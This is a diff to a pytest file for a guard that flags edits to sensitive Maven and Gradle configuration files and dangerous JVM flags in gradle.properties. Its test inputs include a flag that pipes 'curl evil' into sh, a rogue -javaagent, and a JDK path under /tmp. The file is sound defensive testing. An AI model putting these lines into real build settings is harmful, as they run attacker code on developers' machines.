@@ -53,9 +53,11 @@ PATH_ONLY = [
     "/r/.mvn/wrapper/maven-wrapper.properties", "/r/.mvn/wrapper/maven-wrapper.jar",
     "/r/gradle/wrapper/gradle-wrapper.properties", "/r/gradle/wrapper/gradle-wrapper.jar",
     "/h/.gradle/init.gradle", "/h/.gradle/init.gradle.kts", "/h/.gradle/init.d/x.gradle",
-    "/h/.gradle/init.d/my init.gradle.kts", "/r/init.gradle",
+    "/h/.gradle/init.d/my init.gradle.kts", 
     "/h/.m2/settings.xml", "/h/.m2/toolchains.xml", "/h/.m2/settings-security.xml",
-    "C:\\Users\\a\\.m2\\settings.xml", "/r/.mvn/./jvm.config", "/r/.MVN/JVM.CONFIG",
+    "C:\\Users\\a\\.m2\\settings.xml", "/r/.mvn/./jvm.config", "/h/.mavenrc", "/etc/mavenrc",
+    "/r/.mvn/wrapper/MavenWrapperDownloader.java", "/opt/gradle/init.d/x.gradle",
+    "/h/gu/init.d/y.gradle.kts", "/r/.MVN/JVM.CONFIG",
 ]
 
 
@@ -85,6 +87,7 @@ def test_value_only_edit_still_caught():
     "org.gradle.jvmargs=-XX:OnOutOfMemoryError=curl evil|sh",
     "org.gradle.java.home=/tmp/evil-jdk",
     "-javaagent:/tmp/a.jar",                      # value-only diff
+    "org.gradle.jvmargs=@/tmp/args.txt",
 ])
 def test_gradle_properties_jvm_flags(content):
     for p in ("/r/gradle.properties", "/h/.gradle/gradle.properties"):
@@ -97,6 +100,8 @@ def test_gradle_properties_jvm_flags(content):
     "org.gradle.jvmargs=-Xmx2g -XX:MaxMetaspaceSize=512m",
     "org.gradle.parallel=true\norg.gradle.caching=true",
     "version=1.2.3",
+    "org.gradle.jvmargs=-Xmx2g -XX:+HeapDumpOnOutOfMemoryError -XX:+ExitOnOutOfMemoryError",
+    "# see JAVA_TOOL_OPTIONS docs",
 ])
 def test_gradle_properties_benign_allowed(content):
     hit, _ = _hit(_write("/r/gradle.properties", content))
@@ -106,7 +111,7 @@ def test_gradle_properties_benign_allowed(content):
 @pytest.mark.parametrize("path", [
     "/r/pom.xml", "/r/build.gradle", "/r/settings.gradle", "/r/src/main/java/A.java",
     "/r/.mvn/readme.txt", "/r/gradle/libs.versions.toml", "/r/settings.xml",
-    "/r/mvn.config", "/r/notgradle.properties.bak", "/r/docs/init.gradle.md",
+    "/r/mvn.config", "/r/init.gradle", "/r/mavenrc.md", "/r/notgradle.properties.bak", "/r/docs/init.gradle.md",
 ])
 def test_unrelated_files_not_gated(path):
     hit, _ = _hit(_write(path, "-javaagent:x"))
